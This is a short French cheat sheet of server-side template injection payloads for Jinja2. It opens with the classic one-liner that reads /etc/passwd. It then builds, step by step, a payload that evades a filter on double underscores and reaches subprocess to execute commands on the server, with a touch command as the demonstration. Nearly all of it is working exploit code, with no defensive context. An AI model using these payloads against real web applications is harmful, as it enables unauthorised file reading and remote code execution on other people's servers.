# Payload le plus classique

    {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

# Payloads permettant de contourner un filtre sur "__"

Exemple : 

    {% set string = "ssti" %}
    {% set class = "__class__" %}
    {% set mro = "__mro__" %}
    {% set subclasses = "__subclasses__" %}

Obtention de __class__ : 

    {% set string = "ssti" %}
    {% set class = "__class__" %}
    {% set mro = "__mro__" %}
    {% set subclasses = "__subclasses__" %}
    
    {% set mro_r = string|attr(class)|attr(mro) %}
    {{ mro_r[1] }}

Obtention de __subclasses__

    {% set string = "ssti" %}
    {% set class = "__class__" %}
    {% set mro = "__mro__" %}
    {% set subclasses = "__subclasses__" %}
    
    {% set mro_r = string|attr(class)|attr(mro) %}
    {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
    {{ subclasses_r }}

Accès à l'index 420 (subprocess) : 

    {% set string = "ssti" %}
    {% set class = "__class__" %}
    {% set mro = "__mro__" %}
    {% set subclasses = "__subclasses__" %}
    
    {% set mro_r = string|attr(class)|attr(mro) %}
    {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
    {{ subclasses_r[420] }}

RCE : 

    {% set string = "ssti" %}
    {% set class = "__class__" %}
    {% set mro = "__mro__" %}
    {% set subclasses = "__subclasses__" %}
    
    {% set mro_r = string|attr(class)|attr(mro) %}
    {% set subclasses_r = mro_r[1]|attr(subclasses)() %}
    {{ subclasses_r[420](["/usr/bin/touch","/tmp/das-ist-walter"]) }}
